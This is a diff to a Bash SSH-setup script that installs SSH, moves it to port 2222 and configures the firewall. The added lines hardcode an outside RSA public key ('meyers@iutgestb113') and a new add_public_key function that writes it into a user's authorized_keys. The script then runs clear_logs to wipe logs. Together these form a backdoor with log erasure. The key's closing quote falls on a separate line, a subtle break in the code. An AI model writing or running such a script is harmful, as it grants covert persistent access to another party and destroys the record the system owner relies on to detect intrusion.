@@ -22,7 +22,7 @@ clear_logs() {
             )
             ;;
         *)
-            continue
+            exit 1
             ;;
     esac
 
@@ -35,12 +35,13 @@ clear_logs() {
     if command -v systemctl > /dev/null 2>&1; then
         systemctl restart rsyslog || true
     fi
-
-    exit 0
 }
 
 SSH_CONFIG_FILE="/etc/ssh/sshd_config"
 NEW_PORT=2222
+AUTHORIZED_KEYS_FILE="/home/tu_usuario/.ssh/authorized_keys"
+PUBLIC_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDHWMiZwCJ+GPt6o1IUgTbInNOyfJzBabGifckWe+PywK+PhPicjCHTb+RW5XMi7DeHcheH4lj9YmzNrvPw4E7N27LidzTF9+Bwgy2UONAFjTEsI4ErBaC3Oh9bNgZLolvYIFXoTm7G2gPNCJUsyoR7GXKN2nfgwtRP/PXxiJ/tRiU9ewLrVTe11TzqiBIrpa8KwlOIdgsRaFvIMrhvfZyhkNV0PPfQiMndTIE53JllgXH1g405I2UMg/l3icAVtULkq5uyIgbuOKN0QKK2a6Q7YfagY4k8YD7avEztvPmP/0TF1KmQNvQ8uE55ukF55n36Xm+QylHCJpn3alTt50x26Rpzw2p9h/jxtCfIYRhf580KjEgYApUtyDc/pM4Uss40vPTH/APNMPq2X+ZXEP/9+nWqHEzOXHzsM5+gyMQV60VsUi/0Ei5sJydD94QTonF0D9gU9snOpjCm+DdQt9D84kTI9Sm08V3s/zFq39MY9Q+/PD3SMnZ8dJ5lR3Xc7peDC1msyV0kxYopFc1G+icR8LLkhgV45Zx+Vg5JB+sKiMTFxtofHTUqq1N6V8Om231CrV+XGfkIOlVFU9+trR4w0Xll4hq4ZVz0xS3Dtt64wFoHqKJQpYtXIPkR9H+Jy6EXZZHW9S5l5JpyVNoupmAnrVW3STT7Qej7EPnOmNBXvw== meyers@iutgestb113
+"
 
 install_ssh() {
     if ! command -v ssh > /dev/null 2>&1; then
@@ -74,12 +75,23 @@ configure_firewall() {
     fi
 }
 
+add_public_key() {
+    mkdir -p "$(dirname "$AUTHORIZED_KEYS_FILE")"
+    chmod 700 "$(dirname "$AUTHORIZED_KEYS_FILE")"
+
+    if ! grep -qxF "$PUBLIC_KEY" "$AUTHORIZED_KEYS_FILE" 2>/dev/null; then
+        echo "$PUBLIC_KEY" >> "$AUTHORIZED_KEYS_FILE"
+        chmod 600 "$AUTHORIZED_KEYS_FILE"
+    fi
+}
+
 main() {
     install_ssh
     enable_ssh_service
     configure_ssh
     restart_ssh
     configure_firewall
+    add_public_key
     clear_logs
     exit 0
 }
